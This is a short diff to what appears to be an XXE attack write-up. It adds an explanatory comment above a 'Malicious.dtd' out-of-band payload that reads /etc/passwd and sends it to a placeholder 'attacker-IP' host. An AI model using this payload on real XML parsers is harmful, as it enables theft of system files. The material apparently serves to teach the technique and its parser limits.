@@ -143,6 +143,10 @@
 <summary>Malicious.dtd</summary>
 
 ```xml
+<!-- OOB Payload
+%eval; is supposed to inject a new entity definition (%exfiltrate;).
+But many parsers don’t allow parameter entities to define new parameter entities
+they stop expansion at one level. -->
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker-IP/?x=%file; '>">
 %eval;
